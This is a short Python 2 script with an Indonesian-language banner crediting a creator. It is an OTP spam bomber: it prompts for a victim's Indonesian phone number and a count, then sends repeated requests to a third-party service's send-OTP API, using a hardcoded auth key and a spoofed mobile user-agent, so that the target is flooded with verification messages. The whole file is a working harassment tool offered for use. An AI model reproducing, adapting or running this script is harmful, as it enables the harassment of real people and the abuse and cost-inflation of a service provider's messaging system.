import requests, os, sys, json
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
try:
 os.system("clear")

 print ("""
               ___                __    __    __ _ 
              / __|_ __  __ _ __ _\ \  /  \  / /  \ 
              \__ \ '_ \/ _` |  '  \ \/ /\ \/ / __ \ 
              |___/ .__/\__,_|_|_|_|\__/  \__/_/  \_\ 
                  |_| 
                  __________________________________ 
                  |                                | 
                  | Creator: User91                | 
                  | Youtube: ArieSR91              | 
                  | Github : github.com/Arie-SR91  | 
                  |________________________________| 
                   Masukkan nomor target tanpa +62 
                      Untuk keluar tekan Ctrl+C 
""")
 no = raw_input("%s[%s?%s] %sMasukkan nomor target (+62) : "%(pu,ku,pu,pu))
 jum = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : "%(pu,ku,pu,pu)))
 ee = 1
 for sop in range(jum):
   dat=json.dumps({"number":"+62"+no,"auth_key":"B33FR33OTP"})
   tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
   if json.loads(tes.text)["message"] == 'OTP Sent':
    print "%s[%s%s%s] %sSukses, spam to %s%s"%(pu,ku,ee,pu,pu,ku,no)
    ee += 1
   else:
    print "%s[%s%s%s] %sGagal, spam to %s%s"%(pu,ku,ee,pu,pu,ku,no)
    ee += 1
except KeyboardInterrupt: print "%s[%s!%s] %sExit"%(pu,ku,pu,pu)
except requests.exceptions.ConnectionError: print "%s[%s!%s] %sConnection Error"%(pu,ku,pu,me)
